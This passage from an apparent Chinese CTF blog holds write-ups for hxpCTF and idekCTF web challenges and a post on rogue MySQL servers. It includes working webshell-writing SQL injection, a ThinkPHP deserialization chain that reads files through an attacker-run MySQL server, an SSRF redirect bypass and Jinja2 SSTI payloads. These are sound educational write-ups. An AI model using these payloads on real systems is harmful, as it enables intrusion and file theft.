但是既不知道secret也不知道salt——于是比赛的时候就卡到了这里，但是实际上这里是可以突破的\n注意crypt()的true参数，它会使输出值是raw binary data，也就是说发生这种现象\n$a = \u0026#34;aaaaaaa\u0026#34;; $b = \u0026#34;aaaaaaa\\x00aaaaa\u0026#34;; echo crypt($a, \u0026#39;$2a$07$usesomesillystringforsalt$\u0026#39;); echo crypt($b, \u0026#39;$2a$07$usesomesillystringforsalt$\u0026#39;); 没错！是熟悉的配方——00截断，\\x00之后的内容将被忽略，也就是说对任何$idmd5之后以\\x00开头的值进行crypt()之后得到的$mac是一样的！\n现在需要确定这个$id值，显然本地和远程的$secret值不一样 无法本地直接伪造，我们的方法是大量的GET请求来获得大量的新cookie，观察|之后的部分的出现相同的频率，因为上述情况发生的概率是1/256，如果发生了两次 就可以确定是我们要找的$mac值\nimport requests from tqdm import tqdm macs = [] for _ in tqdm(range(1000)): response = requests.get(\u0026#39;http://65.108.176.96:8888/\u0026#39;) macs.append(response.cookies[\u0026#39;session\u0026#39;].split(\u0026#39;%7C\u0026#39;)[1]) mac_0 = max(macs, key=macs.count) print(mac_0) 有了合适的$mac之后再考虑如何通过sqli写shell，根据cheat sheet整一个payload\n1=1; ATTACH DATABASE \u0026#39;/var/www/html/data/qazxsw.php\u0026#39; as hackz;CREATE TABLE hackz.pwn (dataz text);INSERT INTO hackz.pwn (dataz) VALUES (\u0026#39;\u0026lt;?php echo system(\\\u0026#34;/readflag\\\u0026#34;); ?\u0026gt;\u0026#39;); -- xyz 看着很骚的写shell方式，之前做题没有见到过（这波学到了），这个payload就放入cookie的$id部分即可，带着cookie访问页面post再delete一条内容，再转到/data/qazxsw.php页面就可以看到flag了\nimport requests import random import string from urllib.parse import quote remote_0_mac = \u0026#39;FlDRLIZWMTqtYjAugBkToe66C3Q5PaXnGAyzGL6VpiCmfl%2FQjtvYr2QavlI9lmsrMbQnpPfIMr979D1E4bBa71\u0026#39; cont = \u0026#39;\u0026#39; payload = quote(\u0026#34;1=1; ATTACH DATABASE \u0026#39;/var/www/html/data/qazxsw.php\u0026#39; as hackz;CREATE TABLE hackz.pwn (dataz text);INSERT INTO hackz.pwn (dataz) VALUES (\u0026#39;\u0026lt;?php echo system(\\\u0026#34;/readflag\\\u0026#34;); ?\u0026gt;\u0026#39;); -- xyz\u0026#34;) while \u0026#39;html\u0026#39; not in cont: random_id = \u0026#39;\u0026#39;.join(random.choice(string.ascii_letters) for _ in range(10)) cookies = { \u0026#39;session\u0026#39;: payload + random_id + \u0026#39;%7C\u0026#39; + remote_0_mac } response = requests.get(\u0026#39;http://65.108.176.96:8888/\u0026#39;, cookies=cookies) cont = response.text print(cookies) hxp{dynamically_typed_statically_typed_php_c_I_hate_you_all_equally__at_least_its_not_node_lol_:(}\n参考：wp\n***counter Please check out our minimal view counter. I think it’s secure. Anyway please no hacks.\nhttp://49.12.232.139:8008/\n\u0026lt;?php $rmf = function($file){ system(\u0026#39;rm -f -- \u0026#39;.escapeshellarg($file)); // }; $page = $_GET[\u0026#39;page\u0026#39;] ?? \u0026#39;default\u0026#39;; chdir(\u0026#39;./data\u0026#39;); if(isset($_GET[\u0026#39;reset\u0026#39;]) \u0026amp;\u0026amp; preg_match(\u0026#39;/^[a-zA-Z0-9]+$/\u0026#39;, $page) === 1) { $rmf($page); } file_put_contents($page, file_get_contents($page) + 1); include_once($page); https://gist.github.com/parrot409/3919a4e6ab1eae76d051c5a4d4cfa737\nhttps://tttang.com/archive/1384/#toc_0x03-counter-nginx-request-body-temp-lfi\n***includer\u0026rsquo;s revenge Just sitting here and waiting for PHP 8.1 (lolphp).\nhttp://65.108.176.254:8088/\n\u0026lt;?php ($_GET[\u0026#39;action\u0026#39;] ?? \u0026#39;read\u0026#39; ) === \u0026#39;read\u0026#39; ? readfile($_GET[\u0026#39;file\u0026#39;] ?? \u0026#39;index.php\u0026#39;) : include_once($_GET[\u0026#39;file\u0026#39;] ?? \u0026#39;index.php\u0026#39;); 一句话php，不会，摆了\nZedd师傅这篇太强了，深入分析Nginx-\u0026gt;https://tttang.com/archive/1384/\n作为一名web纯菜狗，太佩服出题人了，是真的强，好厉害啊啊啊啊啊啊啊\n","date":"2021-12-20T23:45:08+08:00","permalink":"https://amiaaaz.github.io/2021/12/20/hxpctf2021-wp/","section":"posts","tags":["wp"],"title":"hxpCTF2021 Wp"},{"categories":["NOTES\u0026SUMMARY"],"contents":"应该是各位带师傅们早就会的点了，做题碰到了拿出来炒个冷饭QwQ；参考链接统一放到最后面啦\n原理\u0026amp;复现 总体思路是这样的：伪造一个mysql的服务端（不需要有完整的数据库的功能 只需向客户端回复greeting package）当有客户端连接到时，可以被服务端访问一个客户端本地的文件（如果本地用户权限允许的话\n帮助我们实现这一目标的sql语句是LOAD DATA INFILE，它用于读取一个文件的内容放入表中，有两种形式\nLoad data infile \u0026#34;/data/data.csv\u0026#34; into table TestTable; Load data local infile \u0026#34;/data/data.csv\u0026#34; into table TestTable; # 有时与FIELDS TERMINATED BY \u0026#39;\\n\u0026#39;一起使用 以上两种写法的差异在于是否有local，也就是是否读取client本地的文件\n在本地用wireshark抓个包康康这一sql语句具体是怎么执行的\n（肥肠意义不明的截图（五个月过去了 能记得才有鬼\n整个过程简化为以下三个阶段\nClient: Request Query: LOAD DATA LOCAL INFIEL \u0026lsquo;/etc/passwd\u0026rsquo; INTO TABLE test FIELDS TERMINATED BY \u0026lsquo;\\n\u0026rsquo; Server: Response TABULAR: /etc/passwd Client: Request[Malformed Packet]: content of /etc/passwd 如果在客户端发送查询后 返回一个Response TABULAR包 并指定要读取的文件 就可以任意读取客户端文件了（前提仍然是have read access）\n甚至不一定需要客户端首先发起 LOAD DATA LOCAL的请求才能response，在官方文档第三段的最后的括号中提示，伪造的客户端可以在任何时候回复一个file-transfer的请求（但利用这个特性前 客户端必须具有CLIENT_LOCAL_FILES属性 （可以在连接mysql时添加 --enable-local-infile 或设置local_infile=ON\n所以一旦有一台恶意的mysql服务器 发出完全相同的数据包去模拟初始的greeting握手过程，之后等待一个客户端的响应（幸运的是大多数MySQL客户端以及程序库都会在握手之后至少发送一次请求，以探测目标平台的指纹信息，比如（select @@version_comment limit 1），再之后就可以伪造load data local infile指令来获取文件了\n我们构造一个具有以下属性的mysql伪服务端：\n发送Server Greeting 等待client: Request Query package 回复请求Response file-transfer 需要发的包格式都在官方文档上可以找到：Protocol::LOCAL_INFILE_Request Protocol::Handshake\n几个已经集成过的伪造server: bettercap Rogue-MySql-Server\n可以用bettercap进行完美实践\n需要设置的项非常简单\nset mysql.server.address 0.0.0.0\t# 如果想用nps之类的代理工具映射到公网端口请务必设置此项 set mysql.server.infile /etc/passwd\t# 想要读取的文件 set mysql.server.outfile /xxxx\t# 保存到本地的位置 set mysql.server.port 1099\t# 随意端口都可以 mysql.server on [红明谷CTF 2021]EasyTP tp3.2.3，有一个现成的链子：ThinkPHP v3.2.* （SQL注入\u0026amp;文件读取）反序列化POP链\n看Application\\Home\\Controller\\IndexController.class.php的代码也跟这个文章中的示例代码大差不差，顺着这篇文章的思路跟一下\n首先是全局寻找__destruct()函数\nwww/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php\n寻找一个destroy()\nwww/ThinkPHP/Library/Think/Session/Driver/Memcache.class.php\n这里需要一个$sessID，PHP7下不传参会报错 PHP5不影响，$this-\u0026gt;sessionName可控；接着找含有delete()的类\nwww/ThinkPHP/Mode/Lite/Model.class.php\n相当于传入的参数都可用，可以控制自带的数据库类的delete()方法了\nwww/ThinkPHP/Library/Think/Db/Driver.class.php\n它是拼接了$sql语句，之后执行$this-\u0026gt;execute()\n它会预先进行$this-\u0026gt;initConnect()\n我们可以控制$config，控制连接任意数据库\n这里可以结合上面的mysql伪服务端任意文件读取了，比如以下的利用流程：\n通过某处泄露得到目标的WEB目录（如DEBUG页面 开启MySQL伪服务端，读取目标的数据库配置文件 出发反序列化 触发PDO连接部分 获取到目标的数据库配置文件 用bettercap做mysql伪服务端读一下/etc/passwd\n\u0026lt;?php namespace Think\\Db\\Driver{ use PDO; class Mysql{ protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =\u0026gt; true // 开启才能读取文件 ); protected $config = array( \u0026#34;debug\u0026#34; =\u0026gt; 1, \u0026#34;database\u0026#34; =\u0026gt; \u0026#34;\u0026#34;, \u0026#34;hostname\u0026#34; =\u0026gt; \u0026#34;your_vps\u0026#34;, \u0026#34;hostport\u0026#34; =\u0026gt; \u0026#34;port\u0026#34;, \u0026#34;charset\u0026#34; =\u0026gt; \u0026#34;utf8\u0026#34;, \u0026#34;username\u0026#34; =\u0026gt; \u0026#34;root\u0026#34;, \u0026#34;password\u0026#34; =\u0026gt; \u0026#34;root\u0026#34; ); } } namespace Think\\Image\\Driver{ use Think\\Session\\Driver\\Memcache; class Imagick{ private $img; public function __construct(){ $this-\u0026gt;img = new Memcache(); } } } namespace Think\\Session\\Driver{ use Think\\Model; class Memcache{ protected $handle; public function __construct(){ $this-\u0026gt;handle = new Model(); } } } namespace Think{ use Think\\Db\\Driver\\Mysql; class Model{ protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct(){ $this-\u0026gt;db = new Mysql(); $this-\u0026gt;options[\u0026#39;where\u0026#39;] = \u0026#39;\u0026#39;; $this-\u0026gt;pk = \u0026#39;id\u0026#39;; $this-\u0026gt;data[$this-\u0026gt;pk] = array( \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,user(),31) from test.flag),0x7e),1)#\u0026#34;, \u0026#34;where\u0026#34; =\u0026gt; \u0026#34;1=1\u0026#34; ); } } } namespace { echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick())); $curl = curl_init(); curl_setopt_array($curl, array( CURLOPT_URL =\u0026gt; \u0026#34;http://6382172d-0bab-4e87-b434-7d711efad721.node3.buuoj.cn/\u0026#34;, CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_ENCODING =\u0026gt; \u0026#34;\u0026#34;, CURLOPT_MAXREDIRS =\u0026gt; 10, CURLOPT_TIMEOUT =\u0026gt; 3, CURLOPT_HTTP_VERSION =\u0026gt; CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST =\u0026gt; \u0026#34;POST\u0026#34;, CURLOPT_POSTFIELDS =\u0026gt; base64_encode(serialize(new Think\\Image\\Driver\\Imagick())), CURLOPT_HTTPHEADER =\u0026gt; array( \u0026#34;Postman-Token: 348e180e-5893-4ab4-b1d4-f570d69f228e\u0026#34;, \u0026#34;cache-control: no-cache\u0026#34; ), )); $response = curl_exec($curl); $err = curl_error($curl); curl_close($curl); if ($err) { echo \u0026#34;cURL Error #:\u0026#34; . $err; } else { echo $response; } } 看到了mysql用户，尝试弱口令得到root: root\n之后就可以把我们的伪服务端撤了，换成真服务端的，进行一个注入\n使用目标的数据库配置再次进行反序列化 触发DELETE语句的SQL注入 $this-\u0026gt;data[$this-\u0026gt;pk] = array( // \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#\u0026#34;, // \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#\u0026#34;, // \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(table_name),31) from information_schema.tables where table_schema=\u0026#39;test\u0026#39;),0x7e),1)#\u0026#34;, // \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(column_name),31) from information_schema.columns where table_schema=\u0026#39;test\u0026#39;),0x7e),1)#\u0026#34;, \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(flag),31) from test.flag),0x7e),1)#\u0026#34;, \u0026#34;where\u0026#34; =\u0026gt; \u0026#34;1=1\u0026#34; ); 我们还可以把堆叠打开，用堆叠注入写shell，也就是本题的exp（参考赵总的exp 赵总牛逼\n\u0026lt;?php namespace Think\\Db\\Driver{ use PDO; class Mysql{ protected $options = array( PDO::MYSQL_ATTR_LOCAL_INFILE =\u0026gt; true , // 开启才能读取文件 PDO::MYSQL_ATTR_MULTI_STATEMENTS =\u0026gt; true, // 打开堆叠注入 ); protected $config = array( \u0026#34;debug\u0026#34; =\u0026gt; 1, \u0026#34;database\u0026#34; =\u0026gt; \u0026#34;\u0026#34;, \u0026#34;hostname\u0026#34; =\u0026gt; \u0026#34;127.0.0.1\u0026#34;, \u0026#34;hostport\u0026#34; =\u0026gt; \u0026#34;3306\u0026#34;, \u0026#34;charset\u0026#34; =\u0026gt; \u0026#34;utf8\u0026#34;, \u0026#34;username\u0026#34; =\u0026gt; \u0026#34;root\u0026#34;, // 猜出弱口令 \u0026#34;password\u0026#34; =\u0026gt; \u0026#34;root\u0026#34; ); } } namespace Think\\Image\\Driver{ use Think\\Session\\Driver\\Memcache; class Imagick{ private $img; public function __construct(){ $this-\u0026gt;img = new Memcache(); } } } namespace Think\\Session\\Driver{ use Think\\Model; class Memcache{ protected $handle; public function __construct(){ $this-\u0026gt;handle = new Model(); } } } namespace Think{ use Think\\Db\\Driver\\Mysql; class Model{ protected $options = array(); protected $pk; protected $data = array(); protected $db = null; public function __construct(){ $this-\u0026gt;db = new Mysql(); $this-\u0026gt;options[\u0026#39;where\u0026#39;] = \u0026#39;\u0026#39;; $this-\u0026gt;pk = \u0026#39;id\u0026#39;; $this-\u0026gt;data[$this-\u0026gt;pk] = array( // 堆叠注入写入shell \u0026#34;table\u0026#34; =\u0026gt; \u0026#34;mysql.user where 1=1;select \u0026#39;\u0026lt;?php eval(\\$_POST[amiz]);?\u0026gt;\u0026#39; into outfile \u0026#39;/var/www/html/amiz.php\u0026#39;;#\u0026#34;, \u0026#34;where\u0026#34; =\u0026gt; \u0026#34;1=1\u0026#34; ); } } } namespace { echo base64_encode(serialize(new Think\\Image\\Driver\\Imagick())); $curl = curl_init(); curl_setopt_array($curl, array( CURLOPT_URL =\u0026gt; \u0026#34;http://914146f1-7d08-4a0a-9659-c143df1d68e1.node4.buuoj.cn:81/\u0026#34;, CURLOPT_RETURNTRANSFER =\u0026gt; true, CURLOPT_ENCODING =\u0026gt; \u0026#34;\u0026#34;, CURLOPT_MAXREDIRS =\u0026gt; 10, CURLOPT_TIMEOUT =\u0026gt; 3, CURLOPT_HTTP_VERSION =\u0026gt; CURL_HTTP_VERSION_1_1, CURLOPT_CUSTOMREQUEST =\u0026gt; \u0026#34;POST\u0026#34;, CURLOPT_POSTFIELDS =\u0026gt; base64_encode(serialize(new Think\\Image\\Driver\\Imagick())), CURLOPT_HTTPHEADER =\u0026gt; array( \u0026#34;cache-control: no-cache\u0026#34; ), )); $response = curl_exec($curl); $err = curl_error($curl); curl_close($curl); if ($err) { echo \u0026#34;cURL Error #:\u0026#34; . $err; } else { echo $response; } } 其中curl的代码是用postman生成的 （postman打钱） 一套连招直接带走，用蚁剑连接之后发现根目录下没有flag，反而是一个flag.sh\n我们还得连上数据库看看\n但是蚁剑自带的添加失败，直接手动写一个冰蝎的🐎\n直接查看也是没有，但是可以用它的导出数据库的功能得到数据\n参考：wp1 | wp2\n[DDCTF 2019]MySQL弱口令 没找到环境，看wp云一下\n部署好agent.py之后用bettercap，读/root/.mysql_history拿flag一波带走\n参考：wp\n一个中等好的蜜罐 之所以说中等好，是因为它受制于对应数据库的版本和配置情况，所以并不够通用，可以参考以下两个栗子：\n参考：MySQL蜜罐获取攻击者微信ID | 溯源反制之MySQL蜜罐研究\n唔，是7月做题的时候碰到的点，今天做题又碰到了，于是拿出来鞭个尸，比之前的理解要深刻一些了\n最近在看js原型污染的相关问题，结果考了个四级之后之前写的代码都不认得了😅小丑竟是我自己\n以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（ MySQL connect file read Read MySQL Client\u0026rsquo;s File | 从MySQL出发的反击之路 如何利用MySQL LOCAL INFILE读取客户端文件 MySQL蜜罐获取攻击者微信ID | 溯源反制之MySQL蜜罐研究 ","date":"2021-12-19T20:22:54+08:00","permalink":"https://amiaaaz.github.io/2021/12/19/mysql-pseudo-server/","section":"posts","tags":["MySQL","蜜罐"],"title":"MySQL伪服务端读客户端任意文件"},{"categories":["CTF"],"contents":"https://ctf.idek.team/Challenges 注册之后一直收不到验证邮件，gmail和qq邮箱都不行，但是好像可以直接看题\nMemory of PHP Try to understand how string and variable work in php and also url. http://memory-of-php.rf.gd/\n\u0026lt;?php include(__DIR__.\u0026#34;/lib.php\u0026#34;); $check = substr($_SERVER[\u0026#39;QUERY_STRING\u0026#39;], 0, 32); if (preg_match(\u0026#34;/best-team/i\u0026#34;, $check)) { echo \u0026#34;Who is the best team?\u0026#34;; } if ($_GET[\u0026#39;best-team\u0026#39;] === \u0026#34;idek_is_the_best\u0026#34;) { echo \u0026#34;That a right answer, Here is my prize, \u0026lt;br\u0026gt;\u0026#34;; echo $flag; } show_source(__FILE__); ?\u0026gt; /?best-team=idek_is_the_best 进入http://memory-of-php.rf.gd/secure-bypass.php\n\u0026lt;?php include __DIR__.\u0026#34;/lib2.php\u0026#34;; if (isset($_GET[\u0026#39;url\u0026#39;][15])) { header(\u0026#34;location: {$_GET[\u0026#39;url\u0026#39;]}\u0026#34;); echo \u0026#34;Your url is interesting, here is prize {$flag} \u0026lt;br\u0026gt;\u0026#34;; } else { echo \u0026#34;Plz make me interest with your url \u0026lt;br\u0026gt;\u0026#34;; } show_source(__FILE__); ?\u0026gt; /secure-bypass.php?url[15]=1 idek{nu11_by1e_bypass1ng_1s_C0ol!_ftw_br0!!!!}\nCookie-and-milk I love to eat cookie and milk together. And you?\nhttp://cookie-and-milk.rf.gd/\n\u0026lt;?php include(__DIR__.\u0026#34;/lib.php\u0026#34;); extract($_GET); if ($_SESSION[\u0026#39;idek\u0026#39;] === $_COOKIE[\u0026#39;idek\u0026#39;]) { echo \u0026#34;I love c0000000000000000000000000000000000000kie\u0026#34;; } else if ( sha1($_SESSION[\u0026#39;idek\u0026#39;]) == sha1($_COOKIE[\u0026#39;idek\u0026#39;]) ) { echo $flag; } show_source(__FILE__); ?\u0026gt; 比较狗的一点是它重定向的时候会删除我们的cookie，所以要单独抓包改一下\nidek{C0okie_s1ea1ing_1s_c0ol!!!}\ndifference-check It\u0026rsquo;s important two know what differences exist, so I created a simple tool to check the difference between two websites!\nhttp://difference-check.chal.idek.team | https://ctf.idek.team/handouts/web/DifferenceCheck/difference-check-dist.zip\n可以提供两个url，会进行diff然后返回结果\n使用的是node-fetch和diff库；康一康源码\nconst express = require(\u0026#39;express\u0026#39;); const bodyParser = require(\u0026#39;body-parser\u0026#39;); const app = express(); const ssrfFilter = require(\u0026#39;ssrf-req-filter\u0026#39;); const fetch = require(\u0026#39;node-fetch\u0026#39;); const Diff = require(\u0026#39;diff\u0026#39;); const hbs = require(\u0026#39;express-handlebars\u0026#39;); const port = 1337; const flag = \u0026#39;idek{REDACTED}\u0026#39;; app.use(bodyParser.urlencoded({ extended: true })); app.engine(\u0026#39;hbs\u0026#39;, hbs.engine({ defaultLayout: \u0026#39;main\u0026#39;, extname: \u0026#39;.hbs\u0026#39; })); app.set(\u0026#39;view engine\u0026#39;, \u0026#39;hbs\u0026#39;); async function validifyURL(url){ valid = await fetch(url, {agent: ssrfFilter(url)}) .then((response) =\u0026gt; { return true }) .catch(error =\u0026gt; { return false }); return valid; }; async function diffURLs(urls){ try{ const pageOne = await fetch(urls[0]).then((r =\u0026gt; {return r.text()})); const pageTwo = await fetch(urls[1]).then((r =\u0026gt; {return r.text()})); return Diff.diffLines(pageOne, pageTwo) } catch { return \u0026#39;error!\u0026#39; } }; app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.render(\u0026#39;index\u0026#39;); }); app.get(\u0026#39;/flag\u0026#39;, (req, res) =\u0026gt; { if(req.connection.remoteAddress == \u0026#39;::1\u0026#39;){ res.send(flag)} else{ res.send(\u0026#34;Forbidden\u0026#34;, 503)} }); app.post(\u0026#39;/diff\u0026#39;, async (req, res) =\u0026gt; { let { url1, url2 } = req.body if(typeof url1 !== \u0026#39;string\u0026#39; || typeof url2 !== \u0026#39;string\u0026#39;){ return res.send({error: \u0026#39;Invalid format received\u0026#39;}) }; let urls = [url1, url2]; for(url of urls){ const valid = await validifyURL(url); if(!valid){ return res.send({error: `Request to ${url} was denied`}); }; }; const difference = await diffURLs(urls); res.render(\u0026#39;diff\u0026#39;, { lines: difference }); }); app.listen(port, () =\u0026gt; { console.log(`App listening at http://localhost:${port}`) }); 可以看到对请求的url用ssrfFilter进行过滤，不允许访问本地的/flag，但是要flag就必须要ssrf，这里Node的版本是alpine，也没法进行http请求切分\n于是我尝试构造一个恶意html页面包含一个跳转的js脚本，但是学艺不精 构造失败了；随后我又尝试了DNS重绑定，但是会被检测出来导致利用失败\n后来看了discord中的解答\n所以说重绑定还是可行的，因为在一个域名被反复横跳地解析ip地址，如果第一次被解析为我们服务器地地址而第二次返回127.0.0.1就可以达到SSRF地效果了；不过看wp之后发现直接用python会更简单\nfrom flask import Flask, redirect from threading import Thread import requests local_url = \u0026#34;http://yourvps_ip:port/\u0026#34; app = Flask(__name__) reqCounter = 0 @app.route(\u0026#39;/\u0026#39;) def exploit(): global reqCounter if reqCounter == 0: reqCounter += 1 return \u0026#39;hey\u0026#39; else: reqCounter -= 1 return redirect(\u0026#39;http://localhost:1337/flag\u0026#39;) def start_server(): app.run(\u0026#39;0.0.0.0\u0026#39;, 88) def send_payload(): url = \u0026#34;http://difference-check.chal.idek.team/diff\u0026#34; payload = {\u0026#34;url1\u0026#34;: local_url, \u0026#34;url2\u0026#34;: \u0026#34;http://v3zbv72qksii3rrtyl113zsi096zuo.burpcollaborator.net/\u0026#34;} r = requests.post(url, data=payload) print(r.text) if __name__ == \u0026#39;__main__\u0026#39;: Thread(target=start_server).start() Thread(target=send_payload).start() idek{d1ff3r3nc3_ch3ck3r_d3ce1v3d_bY_d1ff3r3nc3s}\n使用重定向的方式，避开ssrfFilter的过滤，学到了\nSourceless Guessy Web \u0026ldquo;If it has a website its web\u0026rdquo;\nhttps://sgw.chal.imaginaryctf.org/\n首页上没东西，就两行字\n而且也不能爆破，尝试了经典路由都没什么反应，看审查元素\n抓包会看到响应头一直带着report-uri=\u0026quot;https://sentry.repl.it/api/10/security/?sentry_key=xxxx这样的东西，访问https://sgw.chal.imaginaryctf.org/__repl就会看到源码了\nidek{why_do_people_keep_st0ring_secrets_0n_replit_w1th0ut_3nv}\nJinJail\u0026amp;Baby JinJail I\u0026rsquo;ve looked all over the internet for payloads or techniques to bypass my SSTI filter, but none would work! Surely this is secure?\nhttp://jinjail.chal.idek.team | https://ctf.idek.team/handouts/web/JinJail/jinjail-dist.zip\nJinjail was a bit harder than anticipated, so here\u0026rsquo;s a baby version without the character limit to familiarize yourself with some jinja2 SSTI techniques!\nhttp://baby-jinjail.chal.idek.team | https://ctf.idek.team/handouts/web/BabyJinJail/baby-jinjail-dist.zip\n（这个图里注释有一些不对的地方 懒得改了\n构造卡到我的地方是禁用了单双引号，一般情况下过滤引号可以使用chr()来表示字符，但是这个方法有需要用到数字；我们现在需要的是一个纯字母的SSTI payload\n# official payload {{lipsum[(dict(__globals__=x)|list)[False]][(dict(os=x)|list)[False]][(dict(popen=x)|list)[False]]([(dict(cat=x)|list)[False]|center,(dict(galf=x)|list)[False]|reverse]|join)[(dict(daer=x)|list)[False]|reverse]()}} lipsum跟url_for, get_flashed_messages一样是一个在flask中的内置函数，比如url_for可以这样用\n{{url_for.__init__}} 对于关键字的过滤使用了(dict()|list)[False]的方式进行一个绕过，但是说实话我并不清楚这个False的用意是什么，如果不带False或用了True返回的结果都是空的，我也没有查到相关的资料（如果有带师傅看到了请务必指教！！！\n还有从discord里看到的其它版本的payload，也是用到了各种各样的过滤器\n{{(dict(a=x)|last)[dict(__cl=x,ass__=x)|join][dict(__mro__=x)|last][dict(a=x)|last|count][dict(__subcl=x,asses__=x)|join]()[dict(gc=x)|last|int(base=(dict(aaaaaaaaaaaaaaaaaa=x)|last|count))]()[dict(open=x)|last](dict(fl=x,ag=x)|join)[dict(read=x)|last]()}} 如果搭配上dict()这样的用法也是可以接|attr()的，上面我写的注释并没有考虑到这一点，我的（因为做题的时候还不清楚这些奇妙的过滤器操作，学到咯\n{{((((dict|attr(dict(__mro__=x)|first))|last|attr(dict(__subclas=x)|first%2bdict(ses__=x)|first)()))[([a,a,a,a]|length|string%2b[a,a]|length|string%2b[a,a,a]|length|string)|int])(dict(fla=x)|first%2bdict(g=x)|first)|attr(dict(read=_x)|first)()}} idek{us1nG_f1lt3rs_t0_byP4s5_f1lt3r5}\nfancy-notes Your typical note taking app, but this time it\u0026rsquo;s fancy! Share your coolest notes with the admin, and if they\u0026rsquo;re cool enough, maybe he\u0026rsquo;ll give you a special prize.\nhttp://fancy-notes.chal.idek.team | https://ctf.idek.team/handouts/web/FancyNotes/fancy-notes-dist.zip\n一个flask，有提交notes的地方，尝试SSTI失败\n看代码逻辑没有什么特别的\nfrom flask import Flask, redirect, request, session, send_from_directory, render_template import os import sqlite3 import subprocess app = Flask(__name__, static_url_path=\u0026#39;/static\u0026#39;, static_folder=\u0026#39;static\u0026#39;, template_folder=\u0026#39;templates\u0026#39;) app.secret_key = os.getenv(\u0026#39;SECRET\u0026#39;, \u0026#39;secret\u0026#39;) # secret passwd在环境变量中 ADMIN_PASS = os.getenv(\u0026#39;ADMIN_PASS\u0026#39;, \u0026#39;password\u0026#39;) flag = open(\u0026#39;flag.txt\u0026#39;, \u0026#39;r\u0026#39;).read() # flag is here def init_db(): con = sqlite3.connect(\u0026#39;/tmp/database.db\u0026#39;) # sqlite数据库 cur = con.cursor() cur.execute(\u0026#39;CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT NOT NULL UNIQUE, password TEXT NOT NULL)\u0026#39;) cur.execute(\u0026#39;INSERT INTO USERS (username, password) VALUES (\u0026#34;admin\u0026#34;, ?)\u0026#39;, [ADMIN_PASS]) # 插入admin账号密码 cur.execute(\u0026#39;CREATE TABLE IF NOT EXISTS notes (title TEXT NOT NULL, content TEXT NOT NULL, owner TEXT NOT NULL)\u0026#39;) cur.execute(\u0026#39;INSERT INTO notes (title, content, owner) VALUES (\u0026#34;flag\u0026#34;, ?, 1)\u0026#39;, [flag]) # 插入flag进入notes表 con.commit() con.close() def try_login(username, password): # 从数据库中看有没有匹配的账号密码 返回第一条 不存在覆盖 con = sqlite3.connect(\u0026#39;/tmp/database.db\u0026#39;) cur = con.cursor() cur.execute(\u0026#39;SELECT * FROM users WHERE username = ? AND password = ?\u0026#39;, [username, password]) row = cur.fetchone() if row: return {\u0026#39;id\u0026#39;: row[0], \u0026#39;username\u0026#39;: row[1]} def try_register(username, password): # 插入新的用户名数据进入users表 con = sqlite3.connect(\u0026#39;/tmp/database.db\u0026#39;) cur = con.cursor() try: cur.execute(\u0026#39;INSERT INTO users (username, password) VALUES (?, ?)\u0026#39;, [username, password]) except sqlite3.IntegrityError: return None con.commit() con.close() return True def find_note(query, user): # 寻找user的note con = sqlite3.connect(\u0026#39;/tmp/database.db\u0026#39;) cur = con.cursor() cur.execute(\u0026#39;SELECT title, content FROM notes WHERE owner = ? AND (INSTR(content, ?) OR INSTR(title,?))\u0026#39;, [user, query, query]) rows = cur.fetchone() return rows def get_notes(user): # 得到user的全部notes con = sqlite3.connect(\u0026#39;/tmp/database.db\u0026#39;) cur = con.cursor() cur.execute(\u0026#39;SELECT title, content FROM notes WHERE owner = ?\u0026#39;, [user]) rows = cur.fetchall() return rows def create_note(title, content, user): # 创建user的note进入notes表 con = sqlite3.connect(\u0026#39;/tmp/database.db\u0026#39;) cur = con.cursor() cur.execute(\u0026#39;SELECT title FROM notes where title=? AND owner=?\u0026#39;, [title, user]) row = cur.fetchone() if row: return False cur.execute(\u0026#39;INSERT INTO notes (title, content, owner) VALUES (?, ?, ?)\u0026#39;, [title, content, user]) con.commit() con.close() return True @app.before_first_request # 请求之前先删除/tmp/database.db 之后初始化 def setup(): try: os.remove(\u0026#39;/tmp/database.db\u0026#39;) except: pass init_db() @app.after_request # 返回响应时针对cache添加no-store的响应头 def add_headers(response): response.headers[\u0026#39;Cache-Control\u0026#39;] = \u0026#39;no-store\u0026#39; return response @app.route(\u0026#39;/\u0026#39;) def index(): if not session: return redirect(\u0026#39;/login\u0026#39;) # 没有session记录先登录 notes = get_notes(session[\u0026#39;id\u0026#39;]) # session[\u0026#39;id\u0026#39;]中存储id session[\u0026#39;username\u0026#39;]中存储username return render_template(\u0026#39;index.html\u0026#39;, notes=notes, message=\u0026#39;select a note to fancify!\u0026#39;) # 无过滤但是不存在SSTI @app.route(\u0026#39;/login\u0026#39;, methods = [\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;GET\u0026#39;: return render_template(\u0026#39;login.html\u0026#39;) if request.method == \u0026#39;POST\u0026#39;: password = request.form[\u0026#39;password\u0026#39;] username = request.form[\u0026#39;username\u0026#39;] user = try_login(username, password) # 匹配admin或flag if user: session[\u0026#39;id\u0026#39;] = user[\u0026#39;id\u0026#39;] session[\u0026#39;username\u0026#39;] = user[\u0026#39;username\u0026#39;] return redirect(\u0026#39;/\u0026#39;) else: return render_template(\u0026#39;login.html\u0026#39;, message=\u0026#39;login failed!\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, 